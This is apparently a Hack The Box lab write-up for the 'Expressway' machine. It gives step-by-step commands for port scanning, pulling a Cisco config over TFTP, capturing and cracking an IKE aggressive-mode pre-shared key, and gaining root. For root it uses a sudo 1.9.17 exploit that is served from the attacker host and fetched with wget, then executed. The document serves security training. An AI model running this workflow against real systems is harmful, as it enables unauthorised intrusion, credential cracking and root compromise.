# HTB — Expressway

**Metadata**

```text
Target: 10.10.11.87
Name: HTB - Expressway
Date: 2025-10-12
Author: J0rg3
Status: Finished
```

---

# Table of Contents
1. [Server Status](#server-status)
2. [Nmap Scan (TCP / UDP)](#nmap-scan-tcp--udp)
   - [TCP Scan (Full Port Scan)](#tcp-scan-full-port-scan)
   - [UDP Scan (Top Ports / Notes)](#udp-scan-top-ports--notes)
3. [TFTP Enumeration](#tftp-enumeration)
   - [NSE TFTP Scan](#nse-tftp-scan)
   - [Important Files / Notes](#important-files--notes)
4. [IKE / IPsec Enumeration](#ike--ipsec-enumeration)
   - [Aggressive Mode Handshake](#aggressive-mode-handshake)
   - [PSK Extraction & Cracking](#psk-extraction--cracking)
5. [sudo Enumeration & Privilege Escalation](#sudo-enumeration--privilege-escalation)
6. [Flags / Artifacts](#flags--artifacts)
7. [Quick FAQ / Notes](#quick-faq--notes)

---

# Server Status

Goal: Quickly check availability — Ping / reachability.

```bash
# Single ping
ping 10.10.11.87 -c1
```

Example output:
```text
64 bytes from 10.10.11.87: icmp_seq=1 ttl=63 time=20.1 ms
--- 10.10.11.87 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss
```

---

# Nmap Scan (TCP / UDP)

## TCP Scan (Full Port Scan)
Goal: Detect open TCP ports and service versions.

```bash
# Full TCP port scan + service detection
nmap -p- -T4 -sV 10.10.11.87 -vv -oN expressway_tcp_full.txt
```

Example (relevant):
```text
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

> 💡 Tip: `-p-` scans all 65,535 TCP ports. For faster results, use `--top-ports 1000`.

---

## UDP Scan (Top Ports / Notes)
Goal: Identify UDP services (takes longer, requires sudo).

```bash
# UDP Top-Ports Scan (faster) — requires root
sudo nmap -sU -p- -T4 10.10.11.87 -vv -oN expressway_udp_full.txt --top-ports 25
```

Example output:
```text
500/udp   open    isakmp
69/udp    open    tftp
4500/udp  open|filtered  nat-t-ike
53/udp    open|filtered  domain
```

> ⚠️ Note: UDP scans often show `open|filtered` — use additional tools (e.g., `socat`, `ncat`) to confirm service banners.

---

# TFTP Enumeration

Goal: Enumerate and download publicly accessible TFTP files.

## NSE TFTP Scan

```bash
# Nmap TFTP NSE Scan
nmap -p 69 -sV -sU --script tftp* 10.10.11.87 -vv -oN expressway_tftp_nse.txt
```

Example output:
```text
69/udp open  tftp    Netkit tftpd or atftpd
| tftp-enum:
|_  ciscortr.cfg
```

### Download a file
```bash
# Interactive TFTP download
tftp 10.10.11.87
tftp> get ciscortr.cfg
tftp> quit
```

> 💡 Tip: Some TFTP servers allow only read access or are restricted. NSE’s `tftp-enum` helps discover accessible filenames.

---

## Important Files / Notes

Example content from `ciscortr.cfg` (shortened / redacted):

```text
version 12.3
no service pad
service timestamps debug datetime msec
service timestamps log datetime msec
no service password-encryption
!
hostname expressway
!
enable password *****
!
username ike password *****
...
```

- `no service password-encryption` often means plaintext passwords in config files — valuable for further enumeration.
- `username ike` suggests a user named `ike` — useful for future authentication attempts.

> 🔎 Note: In Cisco configs, passwords can appear in several forms (`enable secret`, `enable password`, `username secret`). Check if they’re truly plaintext.

---

# IKE / IPsec Enumeration

Goal: Extract aggressive mode info, ID, and PSK hash for offline cracking.

## Aggressive Mode Handshake
```bash
# Basic Aggressive Mode Scan
sudo ike-scan -A 10.10.11.87
```

Example output includes:
```
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
VID=... (XAUTH)
```

## PSK Handshake Capture / Full Aggressive Mode
```bash
# Full Aggressive Mode with parameter output
sudo ike-scan -M -A -P ike.psk 10.10.11.87
```

> 💡 Tip: `-M` saves material (e.g., `ike.psk`) for offline cracking.

---

## PSK Extraction & Cracking

```bash
# Crack extracted PSK (example using psk-crack)
psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk
```

Successful example:
```text
key "freakingrockstarontheroad" matches SHA1 hash ...
```

**Recovered password (from crack):** `freakingrockstarontheroad`

---

# sudo Enumeration & Privilege Escalation

Goal: Check for local vulnerabilities or misconfigurations that lead to root.

## Check sudo version
```bash
# On target (logged-in user)
sudo -V
```

Example:
```text
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
```

## Search for exploits
Use `searchsploit` to look for matching vulnerabilities.

```bash
searchsploit sudo
```

Relevant hits:
```
Sudo 1.9.17 Host Option - Elevation of Privilege   | linux/local/52354.txt
Sudo chroot 1.9.17 - Local Privilege Escalation   | linux/local/52352.txt
```

### Example workflow — Extract, upload, execute

1. Extract exploit:
```bash
searchsploit -m 52352
cp 52352.txt exploit.sh
```

2. Start HTTP server for easy transfer:
```bash
python -m http.server 8000
```

3. On the target (as vulnerable user):
```bash
wget http://<kali_ip>:8000/exploit.sh -O /tmp/exploit.sh
chmod +x /tmp/exploit.sh
/tmp/exploit.sh
```

Successful result:
```text
root@expressway:/# ls /root
root.txt
root@expressway:/root# cat root.txt
daba3be7b1974359f30c6a******
```

---

# Flags / Artifacts
- `root.txt` (truncated in this cheatsheet): `daba3be7b1974359f30c6a******`
- User: `ike`
- Found config file: `ciscortr.cfg`
- Cracked PSK: `freakingrockstarontheroad`

---

# Quick FAQ / Notes

- **Why use `ike-scan`?**  
  To fingerprint IKE/IPsec endpoints and collect Aggressive Mode handshakes for offline cracking.

- **Why is TFTP interesting?**  
  It’s often used by routers, switches, and VoIP systems for configuration or firmware backups. These configs frequently contain credentials.

- **UDP scans are slow — what to do?**  
  Use `--top-ports` for quick checks, increase timeouts (`--host-timeout`, `--max-retries`), or use focused probe tools like `sipvicious`, `ike-scan`, or `tftp`.
